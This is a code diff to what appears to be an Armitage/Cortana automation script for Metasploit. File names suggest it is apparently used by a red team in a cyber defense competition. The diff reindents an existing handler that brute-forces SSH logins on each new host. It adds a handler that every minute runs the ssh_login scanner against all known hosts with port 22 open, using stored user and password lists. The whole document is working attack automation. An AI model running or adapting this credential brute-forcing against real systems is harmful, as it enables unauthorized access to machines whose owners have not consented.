@@ -18,13 +18,30 @@ on service_add_1433 {
 
 on service_add_22 {
 	println("Bruteforcing new SSH service on $1");
+
 	auxiliary("scanner/ssh/ssh_login", @($1), %(
-		USER_FILE =>	"/root/ccdc_users.txt",
+      USER_FILE =>	"/root/ccdc_users.txt",
 		PASS_FILE => 	"/root/ccdc_passwords.txt",
-    USER_AS_PASS => "true",
-    VERBOSE => "false",
-    THREADS => "10",
-    DB_ALL_USERS => "true",
-    DB_ALL_PASS => "true",
+      USER_AS_PASS => "true",
+      VERBOSE => "false",
+      THREADS => "10",
+      DB_ALL_USERS => "true",
+      DB_ALL_PASS => "true",
 	));
 }
+
+on heartbeat_1m {
+   println("Bruteforcing SSH on all known hosts");
+   println(join(",", service_open(22)));
+
+   auxiliary("scanner/ssh/ssh_login", service_open(22), %(
+      USER_FILE =>   "/root/ccdc_users.txt",
+      PASS_FILE =>   "/root/ccdc_passwords.txt",
+      USER_AS_PASS => "true",
+      VERBOSE => "false",
+      THREADS => "10",
+      DB_ALL_USERS => "false",
+      DB_ALL_PASS => "false",
+   ));
+}
+
